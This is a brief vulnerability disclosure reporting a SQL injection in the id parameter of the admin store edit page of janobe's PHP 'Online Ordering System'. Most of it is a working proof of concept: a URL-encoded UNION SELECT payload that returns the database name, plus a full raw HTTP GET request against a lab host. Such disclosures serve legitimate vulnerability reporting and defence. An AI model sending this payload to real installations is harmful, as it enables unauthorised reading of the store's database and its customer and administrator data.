# Online Ordering System By janobe has SQL injection vulnerability

Author： Wang Chen Jun

vendor: https://www.sourcecodester.com/php/12978/online-ordering-system-phpmysqli.html

Vulnerability file: /ordering/admin/store/index.php?view=edit&id=

Vulnerability location: /ordering/admin/store/index.php?view=edit&id= //id is Injection point

[+]Payload: /ordering/admin/store/index.php?view=edit&id=-9%27%20union%20select%201,database(),3,4,5,6,7--+ //id is Injection point

Current database name: multistoredb

```sql
GET /ordering/admin/store/index.php?view=edit&id=-9%27%20union%20select%201,database(),3,4,5,6,7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/168947045-ba6afccb-90d5-4dc5-9317-dac4d60d58b4.png)

![image](https://user-images.githubusercontent.com/54017627/168947496-464dd6db-4260-4d44-84fe-1ffd33a35c1a.png)
